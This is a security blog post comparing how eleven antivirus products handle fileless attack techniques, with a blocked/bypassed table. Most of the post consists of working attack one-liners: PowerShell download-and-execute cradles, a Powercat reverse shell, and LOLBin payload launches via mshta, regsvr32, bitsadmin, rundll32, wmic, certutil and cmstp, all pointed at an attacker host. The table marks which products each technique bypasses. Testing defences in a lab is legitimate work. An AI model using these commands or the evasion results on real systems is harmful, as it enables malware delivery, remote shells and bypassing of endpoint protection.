---
title: "AV comparison on fileless attack"
date: "2020-04-08"
layout: single
tags:
- Malware
categories:
- Blog-post
---

I've test some fileless command in my lab with AV Protection and here's the result.

| Symbol | Description |
|---|---|
| ✔️ | Blocked |
| ❌ | Bypassed |

---

| Fileless technique | Bitdefender | Avast | Symantec | Webroot | ESET | Karspersky | Sophos | TrendMicro | WinDef | Malwarebytes | Panda Adaptive | 
| --- | ---| ---| ---| ---| ---| ---| ---| ---| ---| ---|---|
| koadic `mshta` | ✔️| ❌|❌ | ❌| ✔️ |❌ | ❌| ❌| ✔️ |❌ |❌ |
| koadic `regsvr` | ✔️|❌ |❌ | ❌|✔️ |✔️ |✔️ |✔️ | ✔️| ❌| ✔️|
| koadic `rundll32_js` | ✔️|❌ |✔️ | ❌|✔️ | ✔️|❌ |✔️ | ✔️| ❌| ✔️|
| koadic `bitsadmin ` | ❌|✔️ |❌ |❌ |✔️ |❌ |✔️ |✔️ |✔️ |❌ | ✔️|
|koadic `disk`|✔️ | ❌| ❌|❌ |✔️ |❌ |✔️ |✔️ |✔️ |❌ | ✔️|
| koadic `wmic` | ✔️|❌ |✔️ |❌ |❌ |✔️ |✔️ | ✔️| ✔️|❌ | ✔️|
| Malicious Powershell line  |✔️ |✔️ |✔️ |❌ | ❌| ✔️|❌ |✔️ | ❌| ❌| ✔️|
| msvenom `msiexec ` |✔️ |✔️ | ✔️|✔️ |✔️ |✔️ | ✔️| ✔️|✔️ |✔️ | ✔️|
| msvenom `certutil `| ✔️| ✔️| ✔️|❌ | ✔️| ✔️|✔️ |✔️ |✔️ |✔️ | ✔️|
| msvenom `batch ` | ✔️| ✔️| ✔️|❌ | ❌|✔️ |❌ |❌  | ✔️|❌ |❌ |
| msvenom `cscript `(vbs)  |✔️ |✔️ |✔️ |❌ |✔️ |✔️ |✔️ |✔️ |✔️ | ✔️| ✔️|
| Powercat | ✔️|✔️ | ✔️|❌ |❌ | ❌|❌ |❌  |✔️ |❌ | ✔️|


# Testcase

My testcase are mostly using msvenom with metasploit and koadic.

## Powershell

Download and execute executable
```
powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/evil.exe', '%temp%\evil.exe'); Start-Process -Filepath '%temp%\evil.exe'"
```

Execute Ps1 file
```
powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.5.128/a.ps1\");powershell -nop -w hidden -c IEX $e
```

Powercat
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.189.131:7777/powercat.ps1');powercat -c 192.168.189.131 -p 9999 -e cmd"
```

Msvenom batch
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.189.131:7777/ms.bat'))
```

Msvenom Vbscript
```
powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/ms.vbs', '%temp%\ms.vbs'); Start-Process %windir%\system32\cscript.exe -Filepath '%temp%\ms.vbs'"
```

Powershell empire stager
```
windows/launcher_bat
windows/launcher_lnk
windows/launcher_sct
windows/launcher_vbs
windows/launcher_xml
windows/backdoorLnkMacro  
windows/macro
windows/bunny             
windows/macroless_msword
windows/csharp_exe        
windows/shellcode
windows/dll               
windows/teensy
windows/ducky
windows/hta
```

Powersploit

## Koadic

Mshta
```
mshta http://192.168.189.131:9999/tT4Fh
```

Regsvr32
```
regsvr32 /s /u /n /i:http://192.168.189.131:9998/d2XfT scrobj
```

Bitsadmin
```
bitsadmin /transfer oZHsz /download /priority high http://192.168.189.131:9995/oZHsz.wsf %temp%\oZHsz.wsf & start /wait %temp%\oZHsz.wsf & del %temp%\oZHsz.wsf
```

Rundll32
```
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://192.168.189.131:9997/eTMXy",false);x.send();eval(x.responseText);window.close();
```

Wmic
```
wmic os get /FORMAT:"http://192.168.189.131:9996/pMeV8.xsl"
```
```
wmic process call create "powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/evil.exe', '%temp%\evil.exe'); Start-Process -Filepath '%temp%\evil.exe'" "
```

## Others

Certutil
```
certutil.exe -urlcache -split -f http://192.168.189.131:7777/ms.exe ms.exe & ms.exe
```

Cmstp
```
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
```

## Disk payload

New tool by thelinuxchoice
```
git clone https://github.com/thelinuxchoice/catchyou
cd catchyou
bash catchyou.sh
```

# Note
Msvenom payload may easily detect by AV because of it's popularity used by many attacker and well recognized by its pattern.
